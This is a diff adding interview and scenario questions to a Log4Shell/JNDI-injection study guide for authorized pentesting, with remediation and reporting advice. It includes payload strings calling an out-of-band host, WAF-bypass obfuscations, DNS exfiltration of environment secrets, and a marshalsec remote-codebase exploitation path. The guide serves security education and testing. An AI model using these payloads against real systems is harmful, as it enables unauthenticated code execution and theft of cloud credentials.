@@ -1,4 +1,4 @@
-# JNDI Injection / Log4Shell — Zero to Expert (100 Q&A)
+# JNDI Injection / Log4Shell — Zero to Expert (120 Q&A)
 
 **Author:** x8bitranjit
 Study guide + field reference. Impact-first: the finding is a **target-sourced OOB callback carrying your unique token**
@@ -351,6 +351,78 @@ Technique A remote-codebase for a fast shell (old embedded JVMs trust codebases)
 
 **100. Final checklist before submitting?**
 Target-sourced callback with my token? Correct input identified? Own OOB + per-input token used? Benign only, exploit server torn down? Technique + version noted? Remediation given? All yes → it's the Critical it's worth.
+
+---
+
+## J. Interview questions (101–112)
+
+> *Bank of the questions a senior/interviewer actually asks — say the crisp version out loud.*
+
+**101. Explain Log4Shell to a non-Java engineer in three sentences.**
+Java has a feature that means "look up this name and give me back the object it points to." Log4j — a logging library in nearly every Java app — would run that lookup on any text it wrote to a log, including attacker-controlled text like a browser's User-Agent. So an attacker just had to get their string logged, and the server would fetch and run attacker code — unauthenticated, before login.
+
+**102. Why is a JNDI/Log4Shell bug "blind," and why is a blind proof still Critical?**
+The vulnerable input rarely appears in the HTTP response, so you can't see the result inline — you confirm out-of-band. It's still Critical because a **DNS/LDAP callback from the target's egress carrying your unique token** proves the string was evaluated by a live JNDI sink; that same primitive is unauthenticated RCE on a reachable JVM, so the callback *is* the proof of the ceiling.
+
+**103. A candidate says "we upgraded to 2.15, we're safe." What's your response?**
+Not necessarily. 2.15 restricted message lookups to localhost but still **performed lookups**, and CVE-2021-45046 showed that attacker input reaching a non-message pattern element (the Thread Context Map / MDC) bypasses the localhost restriction — RCE in some configs, and `${env}` secret exfil over DNS in all of them. Only 2.16 (lookups removed) actually closes it; `formatMsgNoLookups` was declared insufficient.
+
+**104. Does a modern JDK (post-Oct-2018) mitigate the RCE?**
+No — it only changes the technique. `trustURLCodebase=false` (6u211/7u201/8u191/11.0.1) kills the *remote-codebase* path (A), but the *serialized-gadget* path (B, if a classpath gadget exists) and the *BeanFactory/EL local-factory* path (C, if Tomcat is on the classpath) still reach RCE. I always note the technique in the report so it isn't wrongly closed as "mitigated by JDK version."
+
+**105. What's the single fact that most changes your exploitation plan?**
+Whether **lookups still resolve but object-delivery egress is closed.** If DNS canaries return but LDAP never connects back, I stop chasing a shell and pivot to `${env}`/`${sys}` **secret exfil over DNS** — the thing this class can do that a plain deserialization bug can't. It turns a "patched" host into stolen cloud credentials.
+
+**106. How do you distinguish JNDI injection from LDAP injection in one line?**
+LDAP injection tampers an LDAP **query filter** to bypass auth or read the directory; JNDI injection makes the JVM **connect to an attacker's LDAP server** to fetch a malicious object for RCE. Same protocol name, completely different bug and ceiling.
+
+**107. Why is the attack surface for Log4Shell so much larger than a typical injection?**
+Because the trigger is **logging**, not a processing path. Anything the app writes down — a failed-login username, a 404'd URL, a rejected header, a value a back-office worker logs later — is a candidate, including headers nobody validates. That's why you spray a per-input canary into *everything* and let the callback name the vulnerable input.
+
+**108. Someone hands you a scanner report saying "Log4j detected." Is that a finding?**
+No — that's a lead. A version banner or a reflected `${jndi:}` proves nothing. A finding is a **target-egress OOB callback correlated to my own per-input token**. I reproduce with my own interactsh/Collaborator before I ever write it up.
+
+**109. Walk me through why the same one primitive yields either RCE or credential theft.**
+The primitive is "make the JVM resolve my URL." What comes back — or whether anything comes back — depends on the JVM's patch state and egress. Reachable object delivery → the LDAP server returns a Reference/serialized object → RCE (A/B/C). Egress/version closes object delivery but lookups still fire → nest `${env:SECRET}` inside the hostname → the secret leaves as a DNS label. One cause, two cash-outs.
+
+**110. What's your remediation advice, in priority order?**
+Upgrade Log4j to **2.17.1+** (or the Java-7 2.12.4 line); if you can't upgrade, **remove `JndiLookup.class`** from the jar. Then defence-in-depth: `trustURLCodebase=false` (default on modern JVMs), **egress-filter outbound LDAP/RMI/DNS** from app servers, never pass user input to `Context.lookup()` (allow-list the name), rotate any secrets that could have been exfiltrated, and patch product-specific JNDI CVEs (H2/Logback/Spring).
+
+**111. Why can DNS-based exfil succeed where everything else is blocked?**
+DNS egress is almost always left open (the app has to resolve names to function), and it resolves *recursively* out through the org's resolvers — so even when HTTP and LDAP egress are firewalled, a `${jndi:dns://…}` lookup with a secret nested in the label still leaves the network. It's also the quietest channel.
+
+**112. What separates a good Log4Shell report from a noisy one?**
+A good one names the **exact input** (which header/param), shows the **token-correlated callback log from the target's egress IP**, states the **JVM/Log4j version + the available technique**, and — where it applies — includes one benign proof (an `id` or a single redacted `${env}` label). A noisy one pastes a scanner banner or a reflected string and claims "Critical RCE" with no callback.
+
+---
+
+## K. Scenario-based questions (113–120)
+
+> *Realistic field situations — decide the next move and the severity.*
+
+**113. Scenario: You inject `${jndi:dns://tok.oob/a}` into `User-Agent` and get a DNS hit from the target's IP, but the `ldap://` variant produces DNS with no LDAP connect-back. What do you conclude and do next?**
+The sink is live and lookups resolve, but object-delivery egress to LDAP is closed (firewall) or it's a 2.15-class host restricting message lookups to localhost. RCE via A/B/C is off this path. **Pivot to `${env}`/`${sys}` secret exfil over DNS** (§11) and blindly fingerprint the version (`${sys:java.version}`). Severity: already **Critical** for the confirmed sink; if a non-empty secret label arrives, report it as High→Critical data theft with the exact creds redacted.
+
+**114. Scenario: A DNS callback for your token arrives, but from a cloud provider's resolver ASN, not the target's egress range, and ~30s after your request. Real or noise?**
+Suspicious — that pattern fits an **AV/scanner sandbox** detonating the payload rather than the app path. Don't report it yet. Re-fire with a fresh unique token, correlate the **source IP/ASN and timing** to the app's known egress, and only count it if the callback demonstrably originates from the target's own infrastructure on the request path.
+
+**115. Scenario: The WAF blocks any request containing the literal `${jndi:`, returning 403. The app is Java. Next steps?**
+The block is a **spelling filter, not a wall.** Rebuild the word from nested lookups Log4j reassembles at runtime: `${${lower:j}ndi:…}`, `${${::-j}${::-n}${::-d}${::-i}:…}`, and rebuild the protocol too (`${lower:l}${lower:d}a${lower:p}`). If those are stripped as well, try a **different logged input** (WAFs rarely inspect every header) or switch to `dns://`. Confirm via OOB, not the 403/200 status.
+
+**116. Scenario: `${sys:java.version}` exfil returns `1.8.0_312`. How does that change your plan?**
+8u312 is post-Oct-2018, so `trustURLCodebase=false` — **skip technique A** (remote codebase is dead). If object delivery egress is open, try **C (BeanFactory/EL)** first (Tomcat is nearly ubiquitous) then **B (classpath serialized gadget)**. If egress is closed, it's the exfil scenario (§11). Note the JDK + technique in the report so it isn't closed as "modern JDK, safe."
+
+**117. Scenario: You confirm the callback and it's an authorized pentest with a shell mandate. The JVM is old (8u102) and Tomcat is present. What's the fastest clean proof?**
+Old JVM → `trustURLCodebase=true` → **technique A (remote codebase)** is the quickest: stand up marshalsec's LDAPRefServer pointing at your HTTP-hosted `Exploit.class`, run **one benign command** (`id` / `hostname` / a unique echo), capture the output, then **tear the server down**. No reverse shell, no persistence — one benign command is the RCE proof.
+
+**118. Scenario: The vulnerable field is a support-ticket "subject" that isn't logged by the front-end app but is rendered in an internal admin console. No callback fires on submission. Is it dead?**
+Not necessarily — this is a **second-order / stored** case. The lookup may fire **later**, when a back-office worker or admin panel logs/renders the stored value, often in a higher-privilege context. Submit the tagged payload, then watch your OOB over a longer window (minutes to hours) for a delayed callback from an internal egress. A delayed hit is still a valid, often higher-impact finding.
+
+**119. Scenario: You find an exposed **H2 database console** in a staging environment. How does the JNDI angle apply and what's the severity?**
+H2's JDBC URL / console can trigger a JNDI lookup (CVE-2021-42392) → RCE, independent of Log4j. Point the datasource/`INIT` at your JNDI URL and confirm via OOB, then (authorized) one benign command. Severity **High→Critical by precondition** (console reachability). Even in staging it's a real finding if it holds prod-like data or pivots into the network — report it as its own JNDI sink, not folded into a Log4j report.
+
+**120. Scenario: On a bug-bounty target you've confirmed a blind callback and exfiltrated one AWS key over DNS. The program allows "demonstrating impact." How far do you go?**
+Stop at the **minimum** that proves it. Validate the creds are live with a single **read-only** call from your own box (`aws sts get-caller-identity`) — never enumerate S3, assume roles, or run anything on the target. Report the confirmed sink, the token-correlated callback, and the redacted key + the `get-caller-identity` ARN as proof of live prod credentials, and recommend immediate rotation. One benign proof each for detection and impact, then STOP.
 
 ---
 
